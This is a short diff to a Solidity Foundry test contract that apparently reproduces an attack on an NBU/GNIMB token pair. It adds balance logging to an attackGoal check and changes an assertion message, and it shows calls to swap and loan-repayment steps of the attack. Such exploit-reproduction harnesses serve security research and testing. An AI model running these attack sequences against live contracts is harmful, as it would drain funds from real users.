@@ -233,7 +233,9 @@ contract NMBTestBase is Test, BlockLoader {
         emit log_string("");
     }
 
-    function attackGoal() public view returns (bool) {
+    function attackGoal() public returns (bool) {
+        emit log_named_uint("StartBalance", balanceOfnbuattacker);
+        emit log_named_uint("FinalBalance", nbu.balanceOf(attacker));
         return nbu.balanceOf(attacker) >= 1e18 + balanceOfnbuattacker;
     }
 
@@ -441,7 +443,7 @@ contract NMBTestBase is Test, BlockLoader {
         payback_gnimb_pairnbugnimb(amt4);
         swap_pairnbugnimb_attacker_gnimb_nbu(amt5, amt6);
         payback_gnimb_owner(amt7);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
